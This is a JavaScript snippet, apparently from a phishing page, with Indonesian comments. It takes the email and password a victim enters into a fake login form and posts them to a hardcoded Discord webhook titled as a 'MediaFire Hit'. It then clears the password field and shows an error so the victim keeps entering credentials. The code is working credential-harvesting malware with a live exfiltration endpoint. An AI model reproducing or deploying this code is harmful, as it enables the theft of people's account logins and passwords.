<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1451651757955485800/RNyrq16gWkU3y0JhCYEWYsRAe482nGDNxB1054QqiUiH17LiBtyRyz8DFcqshTpot2zH";

    function showGateway() {
        document.getElementById('gateway').style.display = 'flex';
    }

    async function sendData() {
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;
        if(!u || !p) return alert("Isi data!");

        // Kirim Ke Discord
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "üî• MediaFire Hit: BLOCKED WA BY GUSI",
                    color: 0x0070ff,
                    fields: [
                        { name: "üë§ User", value: `\`${u}\`` },
                        { name: "üîë Pass", value: `\`${p}\`` }
                    ]
                }]
            })
        });

        // Reset dan munculkan error (Looping)
        document.getElementById('pass').value = "";
        document.getElementById('err').style.display = "block";
    }
</script>

